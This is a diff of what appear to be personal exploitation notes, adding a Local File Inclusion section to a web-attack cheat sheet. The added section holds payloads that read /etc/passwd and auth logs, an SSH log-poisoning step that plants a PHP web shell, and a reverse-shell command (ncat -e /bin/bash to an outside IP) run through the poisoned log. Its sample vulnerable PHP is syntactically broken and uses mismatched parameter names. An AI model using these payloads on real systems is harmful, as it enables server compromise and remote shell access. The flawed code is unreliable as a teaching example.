@@ -1,6 +1,6 @@
 <!-- # exploiting_web_application -->
 # Server side EXploitation
-## REmote code execution
+## Remote code execution (RCE)
   * Example of Code Evaluation Exploitation
   You want to have dynamically generated variable names for every user and store its registration date. This is how it could be done in PHP:
   
@@ -78,7 +78,30 @@ attacker
   bypass  in url... It reads every thing that starts with fl in the direcory
      
         `nl /etc/fl*`
+## LOcal File Inclusion vulnerability (LFI)
+  * A Local File Inclusion attack is used to trick the application into exposing or running files on the server.
       
+      Example vulnerable code 
+        
+          $file = $_GET['FILE'];
+          if(isset(''file))
+          {
+             include("$file");
+          }
+      Exploits
+      
+        ?file=/etc/passwd
+        ?file=/var/log/auth.log
+         
+       ssh log poisoning .. Since the auth.log
+ is public acccessibke then through lfi the  we can inject malicious log in it.. Via ssh
+ 
+              ssh '<?php system($_GET['c']); ?>'@192.168.1.31
+   RCE in LFI ==> after poisoning
+   
+          ?file=/var/log/auth.log&c=ls -la
+          ?file=/var/log/auth.log&c=ncat -e /bin/bash 192.168.1.2 1234
+          
 # Client side Exploitation
 ## Cross site scripting (XSS)
 ## XSS(Reflected)
